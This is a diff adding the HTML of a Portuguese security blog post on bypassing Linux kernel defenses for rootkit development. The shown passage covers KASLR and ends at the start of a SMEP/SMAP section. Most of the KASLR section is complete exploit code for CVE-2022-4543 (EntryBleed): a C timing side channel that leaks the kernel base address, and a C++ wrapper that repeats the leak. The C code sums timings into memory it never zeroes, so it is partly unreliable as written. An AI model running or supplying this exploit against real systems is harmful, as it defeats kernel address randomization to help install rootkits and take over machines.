@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <title>
+  Bypass nas defesas do Kernel Linux · pwnbuffer
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="pwnbuffer">
+<meta name="description" content="Tecnicas avançadas para bypass nas defesas do Kernel Linux com foco em rootkits">
+<meta name="keywords" content="team brazuca!">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bypass nas defesas do Kernel Linux">
+  <meta name="twitter:description" content="Tecnicas avançadas para bypass nas defesas do Kernel Linux com foco em rootkits">
+
+<meta property="og:url" content="https://pwnbuffer.org/posts/black0ut/kernel_linux_bypass/">
+  <meta property="og:site_name" content="pwnbuffer">
+  <meta property="og:title" content="Bypass nas defesas do Kernel Linux">
+  <meta property="og:description" content="Tecnicas avançadas para bypass nas defesas do Kernel Linux com foco em rootkits">
+  <meta property="og:locale" content="pt_br">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-02T00:00:00+00:00">
+    <meta property="article:tag" content="Programming">
+    <meta property="article:tag" content="Maldev">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Kernel">
+
+
+
+
+<link rel="canonical" href="https://pwnbuffer.org/posts/black0ut/kernel_linux_bypass/">
+
+
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
+<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://pwnbuffer.org/">
+      pwnbuffer
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/about/">Sobre</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Artigos</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categorias</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/members/">Membros</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/wallpapers/">Wallpapers</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://pwnbuffer.org/en/posts/black0ut/kernel_linux_bypass/">🇺🇸</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://pwnbuffer.org/posts/black0ut/kernel_linux_bypass/">
+              Bypass nas defesas do Kernel Linux
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-04-02T00:00:00Z">
+                abril 2, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              11 minutos de leitura
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/authors/black0ut/">Black0ut</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/categories/kernel/">Kernel</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/categories/hacking/">Hacking</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/categories/low-level/">Low-Level</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/programming/">Programming</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/maldev/">Maldev</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/kernel/">Kernel</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><span style="color:red"><strong>lights off &amp; black0ut on</strong></span></p>
+<h3 id="1--introdução">
+  1- Introdução
+  <a class="heading-link" href="#1--introdu%c3%a7%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>Olá, Sejam bem vindos!!!
+Nesse artigo vou abordar como as proteções modernas no Kernel Linux atrapalham e mitigam as funções de rootkits e claro como ocorre o seu bypass.</p>
+<h3 id="2-kernel-address-space-layout-randomization-kaslr">
+  2-Kernel Address Space Layout Randomization (KASLR)
+  <a class="heading-link" href="#2-kernel-address-space-layout-randomization-kaslr">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>Sendo uma das principais formas de defesa do Kernel e em outros sistemas, ocorre a randomização dos endereços de memória do kernel em cada boot dificultando assim a exploração do atacante. Em rootkits isto é prejudicial por conta da randomização da <strong>sys_call_table</strong>, acarretando que hooks em syscalls sejam mais difíceis, devido ao seu endereço de memória aleatório.</p>
+<p>Para contornar esse sistema existem alguns métodos, como por exemplo:</p>
+<p><strong>A CVE-2022-4543</strong>, também conhecida como <strong>EntryBleed</strong>, é uma vulnerabilidade no mecanismo de segurança <strong>Kernel Page Table Isolation</strong> (KPTI) do Linux, que permite a um atacante local vazar o endereço base do <strong>KASLR</strong> (Kernel Address Space Layout Randomization) em sistemas Intel. Essa falha explora um canal lateral baseado em temporização do TLB (Translation Lookaside Buffer) para obter informações sensíveis do kernel, comprometendo a aleatorização de memória crítica, por meio do mapeamento da <strong>entry_SYSCALL_64</strong>, que possui o mesmo endereço no espaço de uer e no espaço do kernel, dessa forma podemos usar o <strong>prefetchnta e prefetcht2</strong> são usadas para medir o tempo de acesso a endereços específicos, conseguindo obter o endereço da syscall, esa falha ocorre principalmente em processadores intel, segue abaixo um exploit para exploração dessa vulnerabilidade:</p>
+<p><img alt="1" src="https://dl.acm.org/cms/attachment/html/10.1145/3623652.3623669/assets/html/images/hasp23-6-fig1.jpg"></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
+<label for="tab-0-0" class="tab-label">entryBleed_main.c</label>
+<div class="tab-content tab-content-0-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdint.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">uint64_t</span> <span style="color:#447fcf">sidechannel</span>(<span style="color:#6ab825;font-weight:bold">uint64_t</span> addr)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">uint64_t</span> a, b, c, d;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">asm</span> <span style="color:#6ab825;font-weight:bold">volatile</span>(<span style="color:#ed9d13">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mfence;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;rdtscp;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mov %0, rax;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mov %1, rdx;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;xor rax, rax;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;lfence;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;prefetchnta qword ptr [%4];&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;prefetcht2 qword ptr [%4];&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;xor rax, rax;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;lfence;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;rdtscp;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mov %2, rax;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mov %3, rdx;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;mfence;&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#ed9d13">&#34;.att_syntax;&#34;</span>
+</span></span><span style="display:flex;"><span>                 : <span style="color:#ed9d13">&#34;=r&#34;</span>(a), <span style="color:#ed9d13">&#34;=r&#34;</span>(b), <span style="color:#ed9d13">&#34;=r&#34;</span>(c), <span style="color:#ed9d13">&#34;=r&#34;</span>(d)
+</span></span><span style="display:flex;"><span>                 : <span style="color:#ed9d13">&#34;r&#34;</span>(addr)
+</span></span><span style="display:flex;"><span>                 : <span style="color:#ed9d13">&#34;rax&#34;</span>, <span style="color:#ed9d13">&#34;rbx&#34;</span>, <span style="color:#ed9d13">&#34;rcx&#34;</span>, <span style="color:#ed9d13">&#34;rdx&#34;</span>);
+</span></span><span style="display:flex;"><span>    a = (b &lt;&lt; <span style="color:#3677a9">32</span>) | a;
+</span></span><span style="display:flex;"><span>    c = (d &lt;&lt; <span style="color:#3677a9">32</span>) | c;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> c - a;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define DUMMY_ITERATIONS 5
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define ITERATIONS 100
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">uint64_t</span> <span style="color:#447fcf">leak_syscall_entry</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#6ab825;font-weight:bold">long</span> offset)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#6ab825;font-weight:bold">long</span> STEP = <span style="color:#3677a9">0x100000ull</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#6ab825;font-weight:bold">long</span> SCAN_START = <span style="color:#3677a9">0xffffffff80000000ull</span> + offset, SCAN_END = <span style="color:#3677a9">0xffffffffc0000000ull</span> + offset;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#6ab825;font-weight:bold">long</span> ARR_SIZE = (SCAN_END - SCAN_START) / STEP;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">uint64_t</span> *data = (<span style="color:#6ab825;font-weight:bold">uint64_t</span> *)<span style="color:#447fcf">malloc</span>(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">uint64_t</span>) * ARR_SIZE);
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">uint64_t</span> min = ~<span style="color:#3677a9">0</span>, addr = ~<span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>; i &lt; ITERATIONS + DUMMY_ITERATIONS; i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">uint64_t</span> idx = <span style="color:#3677a9">0</span>; idx &lt; ARR_SIZE; idx++)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">uint64_t</span> test = SCAN_START + idx * STEP;
+</span></span><span style="display:flex;"><span>            <span style="color:#447fcf">syscall</span>(<span style="color:#3677a9">104</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">uint64_t</span> time = <span style="color:#447fcf">sidechannel</span>(test);
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">if</span> (i &gt;= DUMMY_ITERATIONS)
+</span></span><span style="display:flex;"><span>                data[idx] += time;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>; i &lt; ARR_SIZE; i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        data[i] /= ITERATIONS;
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (data[i] &lt; min)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            min = data[i];
+</span></span><span style="display:flex;"><span>            addr = SCAN_START + i * STEP;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> addr;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (argc != <span style="color:#3677a9">2</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">puts</span>(<span style="color:#ed9d13">&#34;[*] Usage: ./binary entry_SYSCALL_64_offset(in hex)&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">char</span> *p_end;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#6ab825;font-weight:bold">long</span> entry_SYSCALL_64_offset = <span style="color:#447fcf">strtoull</span>(argv[<span style="color:#3677a9">1</span>], &amp;p_end, <span style="color:#3677a9">16</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;%llx&#34;</span>, <span style="color:#447fcf">leak_syscall_entry</span>(entry_SYSCALL_64_offset) - entry_SYSCALL_64_offset);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+
+
+
+
+
+<style>
+  .tabs input#tab-0-1:checked ~ .tab-content-0-1 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-1" />
+<label for="tab-0-1" class="tab-label">entryBleed_cpp.cpp</label>
+<div class="tab-content tab-content-0-1">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdint.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;iostream&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fstream&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;map&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span>using namespace std;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">execute_cmd</span>(<span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> *cmd, <span style="color:#6ab825;font-weight:bold">char</span> *result)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">char</span> buf_ps[<span style="color:#3677a9">1024</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">char</span> ps[<span style="color:#3677a9">1024</span>] = {<span style="color:#3677a9">0</span>};
+</span></span><span style="display:flex;"><span>    FILE *ptr;
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">strcpy</span>(ps, cmd);
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> ((ptr = <span style="color:#447fcf">popen</span>(ps, <span style="color:#ed9d13">&#34;r&#34;</span>)) != <span style="color:#24909d">NULL</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">while</span> (<span style="color:#447fcf">fgets</span>(buf_ps, <span style="color:#3677a9">1024</span>, ptr) != <span style="color:#24909d">NULL</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#447fcf">strcat</span>(result, buf_ps);
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">strlen</span>(result) &gt; <span style="color:#3677a9">1024</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">pclose</span>(ptr);
+</span></span><span style="display:flex;"><span>        ptr = <span style="color:#24909d">NULL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;popen %s error</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, ps);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (argc != <span style="color:#3677a9">4</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">puts</span>(<span style="color:#ed9d13">&#34;[*] Usage: ./binary dekaslr_path entry_SYSCALL_64_offset(in hex) max_loop&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    string dekaslr_path = argv[<span style="color:#3677a9">1</span>];
+</span></span><span style="display:flex;"><span>    string koffset = argv[<span style="color:#3677a9">2</span>];
+</span></span><span style="display:flex;"><span>    string max_loop = argv[<span style="color:#3677a9">3</span>];
+</span></span><span style="display:flex;"><span>    string cmd = dekaslr_path + <span style="color:#ed9d13">&#34; &#34;</span> + koffset;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">char</span> result[<span style="color:#3677a9">0x1000</span>] = {<span style="color:#3677a9">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">int</span> max_tries = <span style="color:#447fcf">stoi</span>(max_loop);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    map&lt;string, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span>&gt; base_record;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">size_t</span> i = <span style="color:#3677a9">0</span>; i &lt; max_tries; i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">memset</span>(result, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0x100</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">execute_cmd</span>(cmd.<span style="color:#447fcf">c_str</span>(), result);
+</span></span><span style="display:flex;"><span>        <span style="color:#999;font-style:italic">// printf(&#34;%s\n&#34;, result);
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>        string key = result;
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (base_record.<span style="color:#447fcf">find</span>(key) != base_record.<span style="color:#447fcf">end</span>())
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            base_record[key]++;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            base_record[key] = <span style="color:#3677a9">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    map&lt;string, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span>&gt;::iterator iter;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> max_cnt = <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (iter = base_record.<span style="color:#447fcf">begin</span>(); iter != base_record.<span style="color:#447fcf">end</span>(); iter++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (iter-&gt;second &gt; max_cnt)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            max_cnt = iter-&gt;second;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    string kernel_base;
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (iter = base_record.<span style="color:#447fcf">begin</span>(); iter != base_record.<span style="color:#447fcf">end</span>(); iter++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (iter-&gt;second == max_cnt)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            kernel_base = iter-&gt;first;
+</span></span><span style="display:flex;"><span>            cout &lt;&lt; <span style="color:#ed9d13">&#34;0x&#34;</span> &lt;&lt; kernel_base &lt;&lt; <span style="color:#ed9d13">&#34;: &#34;</span> &lt;&lt; max_cnt &lt;&lt; <span style="color:#ed9d13">&#34;/&#34;</span> &lt;&lt; max_tries &lt;&lt; endl;
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h3 id="3-supervisor-mode-execution-prevention-smep-e-supervisor-mode-access-prevention-smap">
+  3-Supervisor Mode Execution Prevention (SMEP) e Supervisor Mode Access Prevention (SMAP)
+  <a class="heading-link" href="#3-supervisor-mode-execution-prevention-smep-e-supervisor-mode-access-prevention-smap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>Mais um sistema de proteção de mecanismos de segurança baseados em hardware (CPU) que protegem o kernel de ataques que tentam explorar a interação entre o modo kernel (privilegiado) e o modo usuário (não privilegiado)</p>
